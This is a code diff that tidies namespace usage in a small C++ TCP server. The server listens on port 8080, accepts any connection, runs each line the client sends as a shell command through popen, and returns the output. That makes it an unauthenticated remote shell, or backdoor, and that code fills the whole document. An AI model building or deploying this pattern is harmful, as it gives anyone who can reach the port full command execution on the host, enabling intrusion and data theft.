@@ -5,20 +5,22 @@
 #include <unistd.h>
 #include <ctime>
 
+using namespace std;
+
 #define PORT 8080
 #define BUFFER_SIZE 1024
 
 // Function to get server information
-std::string get_server_info() {
+string get_server_info() {
     time_t now = time(0);
     char* dt = ctime(&now);
-    return "Server IP: 127.0.0.1\nCurrent time: " + std::string(dt);
+    return "Server IP: 127.0.0.1\nCurrent time: " + string(dt);
 }
 
 // Function to execute a command and return its output
-std::string execute_command(const std::string& command) {
+string execute_command(const string& command) {
     char buffer[128];
-    std::string result = "";
+    string result = "";
     FILE* pipe = popen(command.c_str(), "r");
     if (!pipe) return "Error executing command.";
     while (!feof(pipe)) {
@@ -37,7 +39,7 @@ int main() {
 
     // Create socket file descriptor
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
-        std::cerr << "Socket creation failed" << std::endl;
+        cerr << "Socket creation failed" << endl;
         return -1;
     }
 
@@ -48,27 +50,27 @@ int main() {
 
     // Bind the socket to the specified IP and port
     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
-        std::cerr << "Bind failed" << std::endl;
+        cerr << "Bind failed" << endl;
         return -1;
     }
 
     // Listen for incoming connections
     if (listen(server_fd, 3) < 0) {
-        std::cerr << "Listen failed" << std::endl;
+        cerr << "Listen failed" << endl;
         return -1;
     }
 
-    std::cout << "Server listening on port " << PORT << std::endl;
+    cout << "Server listening on port " << PORT << endl;
 
     while(true) {
         // Accept a new connection
         if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
-            std::cerr << "Accept failed" << std::endl;
+            cerr << "Accept failed" << endl;
             continue;
         }
 
         // Send server information to the client
-        std::string server_info = get_server_info();
+        string server_info = get_server_info();
         send(new_socket, server_info.c_str(), server_info.length(), 0);
 
         while(true) {
@@ -77,9 +79,9 @@ int main() {
             int valread = read(new_socket, buffer, BUFFER_SIZE);
             if (valread <= 0) break;
 
-            std::string command(buffer);
+            string command(buffer);
             // Execute the command and get the result
-            std::string result = execute_command(command);
+            string result = execute_command(command);
             // Send the result back to the client
             send(new_socket, result.c_str(), result.length(), 0);
         }
